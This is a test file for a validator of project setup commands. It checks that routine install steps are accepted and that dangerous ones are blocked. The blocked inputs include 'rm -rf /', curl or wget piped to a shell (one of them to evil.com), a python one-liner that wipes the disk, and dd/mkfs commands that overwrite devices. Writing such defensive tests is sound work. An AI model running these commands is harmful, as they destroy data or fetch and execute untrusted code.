import { describe, test, expect } from 'bun:test';
import {
  validateCommand,
  validateStep,
  validateSetupContract,
  resolveCommand,
  legacyCommandToContract,
} from './setup-contract';

// ---------------------------------------------------------------------------
// validateCommand
// ---------------------------------------------------------------------------

describe('validateCommand', () => {
  test('accepts safe npm install', () => {
    const result = validateCommand('npm install');
    expect(result.valid).toBe(true);
    expect(result.errors).toHaveLength(0);
  });

  test('accepts pnpm install', () => {
    const result = validateCommand('pnpm install');
    expect(result.valid).toBe(true);
  });

  test('accepts git submodule update', () => {
    const result = validateCommand('git submodule update --init --recursive');
    expect(result.valid).toBe(true);
  });

  test('accepts cp .env.example .env', () => {
    const result = validateCommand('cp .env.example .env');
    expect(result.valid).toBe(true);
  });

  test('rejects empty command', () => {
    const result = validateCommand('');
    expect(result.valid).toBe(false);
    expect(result.errors[0]).toContain('Empty command');
  });

  test('rejects rm -rf /', () => {
    const result = validateCommand('rm -rf /');
    expect(result.valid).toBe(false);
    expect(result.errors[0]).toContain('Blocked dangerous pattern');
  });

  test('rejects rm -rf with various flag orders', () => {
    expect(validateCommand('rm -fr /tmp').valid).toBe(false);
    expect(validateCommand('rm -rf /tmp').valid).toBe(false);
  });

  test('rejects curl piped to bash', () => {
    const result = validateCommand('curl https://example.com/install.sh | bash');
    expect(result.valid).toBe(false);
    expect(result.errors[0]).toContain('Blocked dangerous pattern');
  });

  test('rejects curl piped to sh', () => {
    const result = validateCommand('curl https://example.com/install.sh | sh');
    expect(result.valid).toBe(false);
  });

  test('rejects wget piped to bash', () => {
    const result = validateCommand('wget -qO- https://example.com | bash');
    expect(result.valid).toBe(false);
  });

  test('rejects piping into sh/bash', () => {
    expect(validateCommand('echo "malicious" | sh').valid).toBe(false);
    expect(validateCommand('cat script.sh | bash').valid).toBe(false);
  });

  test('rejects eval', () => {
    const result = validateCommand('eval $(some-command)');
    expect(result.valid).toBe(false);
  });

  test('rejects sudo', () => {
    const result = validateCommand('sudo npm install');
    expect(result.valid).toBe(false);
  });

  test('rejects python -c', () => {
    const result = validateCommand('python -c "import os; os.system(\'rm -rf /\')"');
    expect(result.valid).toBe(false);
  });

  test('rejects node -e', () => {
    const result = validateCommand('node -e "process.exit(1)"');
    expect(result.valid).toBe(false);
  });

  test('rejects dd to device', () => {
    const result = validateCommand('dd if=/dev/zero of=/dev/sda');
    expect(result.valid).toBe(false);
  });

  test('rejects mkfs', () => {
    const result = validateCommand('mkfs.ext4 /dev/sda1');
    expect(result.valid).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// validateStep
// ---------------------------------------------------------------------------

describe('validateStep', () => {
  test('valid npm_install step with default command', () => {
    const result = validateStep({ type: 'npm_install' });
    expect(result.valid).toBe(true);
  });

  test('valid npm_install step with explicit command', () => {
    const result = validateStep({ type: 'npm_install', command: 'pnpm install' });
    expect(result.valid).toBe(true);
    expect(result.warnings).toHaveLength(0);
  });

  test('npm_install step with unexpected command gets warning', () => {
    const result = validateStep({ type: 'npm_install', command: 'make build' });
    expect(result.valid).toBe(true); // still valid, just warned
    expect(result.warnings.length).toBeGreaterThan(0);
    expect(result.warnings[0]).toContain('unexpected command');
  });

  test('valid git_submodules step', () => {
    const result = validateStep({ type: 'git_submodules' });
    expect(result.valid).toBe(true);
  });

  test('valid env_file step', () => {
    const result = validateStep({ type: 'env_file' });
    expect(result.valid).toBe(true);
  });

  test('custom step requires command', () => {
    const result = validateStep({ type: 'custom' });
    expect(result.valid).toBe(false);
    expect(result.errors[0]).toContain('requires a command');
  });

  test('custom step with safe command gets warning', () => {
    const result = validateStep({ type: 'custom', command: 'make build' });
    expect(result.valid).toBe(true);
    expect(result.warnings.length).toBeGreaterThan(0);
    expect(result.warnings[0]).toContain('Custom setup command');
  });

  test('custom step with dangerous command is rejected', () => {
    const result = validateStep({ type: 'custom', command: 'rm -rf /' });
    expect(result.valid).toBe(false);
  });

  test('npm_install step with dangerous override is rejected', () => {
    const result = validateStep({ type: 'npm_install', command: 'curl http://evil.com | bash' });
    expect(result.valid).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// validateSetupContract
// ---------------------------------------------------------------------------

describe('validateSetupContract', () => {
  test('empty contract is valid', () => {
    const result = validateSetupContract({ steps: [] });
    expect(result.valid).toBe(true);
  });

  test('valid multi-step contract', () => {
    const result = validateSetupContract({
      steps: [
        { type: 'npm_install' },
        { type: 'git_submodules' },
        { type: 'env_file' },
      ],
    });
    expect(result.valid).toBe(true);
  });

  test('contract with one bad step is invalid', () => {
    const result = validateSetupContract({
      steps: [
        { type: 'npm_install' },
        { type: 'custom', command: 'curl http://evil.com | sh' },
      ],
    });
    expect(result.valid).toBe(false);
    expect(result.errors[0]).toContain('Step 2');
  });

  test('contract errors include step numbers', () => {
    const result = validateSetupContract({
      steps: [
        { type: 'custom' }, // missing command
        { type: 'custom', command: 'rm -rf /' },
      ],
    });
    expect(result.valid).toBe(false);
    expect(result.errors.some((e) => e.includes('Step 1'))).toBe(true);
    expect(result.errors.some((e) => e.includes('Step 2'))).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// resolveCommand
// ---------------------------------------------------------------------------

describe('resolveCommand', () => {
  test('returns explicit command when provided', () => {
    expect(resolveCommand({ type: 'npm_install', command: 'pnpm install' })).toBe('pnpm install');
  });

  test('returns default for npm_install', () => {
    expect(resolveCommand({ type: 'npm_install' })).toBe('npm install');
  });

  test('returns default for git_submodules', () => {
    expect(resolveCommand({ type: 'git_submodules' })).toBe('git submodule update --init --recursive');
  });

  test('returns default for env_file', () => {
    expect(resolveCommand({ type: 'env_file' })).toBe('cp .env.example .env');
  });

  test('returns empty string for custom without command', () => {
    expect(resolveCommand({ type: 'custom' })).toBe('');
  });
});

// ---------------------------------------------------------------------------
// legacyCommandToContract
// ---------------------------------------------------------------------------

describe('legacyCommandToContract', () => {
  test('maps npm install to npm_install type', () => {
    const contract = legacyCommandToContract('npm install');
    expect(contract.steps).toHaveLength(1);
    expect(contract.steps[0].type).toBe('npm_install');
    expect(contract.steps[0].command).toBe('npm install');
  });

  test('maps pnpm install to npm_install type', () => {
    const contract = legacyCommandToContract('pnpm install');
    expect(contract.steps[0].type).toBe('npm_install');
  });

  test('maps yarn install to npm_install type', () => {
    const contract = legacyCommandToContract('yarn install');
    expect(contract.steps[0].type).toBe('npm_install');
  });

  test('maps bun install to npm_install type', () => {
    const contract = legacyCommandToContract('bun install');
    expect(contract.steps[0].type).toBe('npm_install');
  });

  test('maps git submodule update to git_submodules type', () => {
    const contract = legacyCommandToContract('git submodule update --init');
    expect(contract.steps[0].type).toBe('git_submodules');
  });

  test('maps cp command to env_file type', () => {
    const contract = legacyCommandToContract('cp .env.example .env');
    expect(contract.steps[0].type).toBe('env_file');
  });

  test('maps unknown command to custom type', () => {
    const contract = legacyCommandToContract('make build');
    expect(contract.steps[0].type).toBe('custom');
    expect(contract.steps[0].command).toBe('make build');
  });
});
